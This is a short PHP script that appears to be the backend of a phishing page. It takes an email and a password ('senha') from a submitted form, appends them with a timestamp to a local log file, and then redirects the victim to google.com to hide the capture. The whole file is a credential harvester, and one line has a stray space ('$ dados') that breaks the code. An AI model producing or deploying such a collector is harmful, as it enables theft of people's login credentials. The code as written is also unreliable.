<?php
$email = $_POST['email'] ?? '';
$senha = $_POST['senha'] ?? '';

$dados = date('Y-m-d H:i:s') . " | $email | $senha\n";
file_put_contents('log.txt', $ dados, FILE_APPEND | LOCK_EX);

header('Location: https://google.com');
exit;
?>
